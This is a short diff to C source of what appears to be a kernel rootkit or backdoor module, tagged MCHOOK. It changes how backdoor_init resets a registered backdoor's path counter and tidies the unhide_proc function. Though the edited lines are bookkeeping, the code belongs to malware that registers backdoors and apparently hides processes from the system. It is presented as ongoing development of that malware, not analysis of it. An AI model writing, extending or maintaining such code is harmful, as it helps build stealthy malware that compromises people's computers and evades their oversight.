@@ -1095,8 +1095,12 @@ backdoor_init(char *username, proc_t p)
 #ifdef DEBUG
       printf("[MCHOOK] Already registered user (dead bd) %d\n", bd_index);
 #endif
+      
+      int numPath = g_reg_backdoors[bd_index]->path_counter;
+      g_reg_backdoors[bd_index]->path_counter = 0;
+      
       // Backdoor is already registered
-      for (i = 0; i < g_reg_backdoors[bd_index]->path_counter; i++) {
+      for (i = 0; i < numPath; i++) {
         memset(g_reg_backdoors[bd_index]->path[i], '\0', MAX_DIRNAME_SIZE);
       }
     
@@ -1106,7 +1110,7 @@ backdoor_init(char *username, proc_t p)
   }
 
   // Initialize the structure entry
-  g_reg_backdoors[_index]->path_counter = 0;
+  //g_reg_backdoors[_index]->path_counter   = 0;
   
   g_reg_backdoors[_index]->p              = p;
   /*g_reg_backdoors[_index]->pid            = p->p_pid;*/
@@ -1482,7 +1486,7 @@ int unhide_proc(proc_t p, int backdoor_index)
   
 #ifdef DEBUG
   printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
-#endif  
+#endif
   
   return 0;
 }
